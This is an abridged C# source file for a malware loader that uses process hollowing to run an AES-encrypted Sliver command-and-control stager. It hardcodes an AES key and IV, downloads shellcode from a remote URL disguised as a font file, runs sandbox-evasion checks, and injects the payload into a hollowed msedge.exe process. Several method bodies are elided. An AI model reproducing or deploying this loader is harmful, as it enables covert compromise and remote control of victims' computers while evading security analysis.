/***************
 *  
 * Process Hollowing to load
 * AES encrypted sliver stager
 * 
 * Techniques combined from several projects
 * 
 **************/
...
namespace ProcessHollowEncrypted
{
    public sealed class Loader
    {
        ...
        // Variables
        private static string AESKey = "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfF";
        private static string AESIV = "8y/B?E(G+KbPeShP";
        private static string url = "http://example.com:8080/assets/fonts/fontawesome/firacode0j31.woff";

        public static byte[] DownloadShellcode()
        {
        ...
        public static void Main()
        {
            ...
            // We're too old to play in the sandbox ....
            SandboxChecks.RunChecks();

            // Downloads and AES decrypts sliver stager
            ...
            try
            {
                // Make to compile for x64 to spawn x64 bit processes
                ldr.Load("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", shellcode);       // hollows instance of msedge.exe
            }
            catch (Exception e)
            {
